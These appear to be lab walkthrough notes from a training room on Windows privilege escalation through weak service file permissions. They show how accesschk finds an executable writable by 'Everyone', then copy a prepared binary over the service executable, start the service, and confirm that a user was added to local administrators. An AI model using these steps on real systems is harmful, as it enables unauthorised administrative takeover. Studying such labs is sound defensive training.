**Detection**

Windows VM

1. Open command prompt and type: 

```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
```

![[Pasted image 20240206201517.png]]

2. Notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the filepermservice.exe file.

**Exploitation**

Windows VM

1. Open command prompt and type: 

```
copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
```

3. In command prompt type: 

```
sc start filepermsvc
```  

![[Pasted image 20240206201937.png]]

4. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt:

```
net localgroup administrators
```

Answer the questions below

Click 'Completed' once you have successfully elevated the machine
